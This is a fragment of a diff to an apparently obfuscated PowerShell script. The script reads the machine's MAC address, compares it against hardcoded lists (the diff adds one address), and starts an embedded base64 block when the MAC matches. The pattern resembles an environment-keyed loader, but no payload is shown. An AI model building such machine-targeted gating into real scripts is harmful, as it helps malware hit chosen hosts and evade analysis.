@@ -3,7 +3,7 @@ $zqwxkplmnv = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { 
 $plmnqwtzrk = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object -First 1).MACAddress
 $plmnqwtzrk = $plmnqwtzrk -replace ":", ""
 
-$ch = @("3EF720524153","18C04DB108FC");
+$ch = @("3EF720524153","18C04DB108FC", "525400390066");
 $in = @("E454E8BF66C7","30D0422C3739","247320524153", "EC7B20524153");
 if($in -contains $plmnqwtzrk){
 $base64 = @'
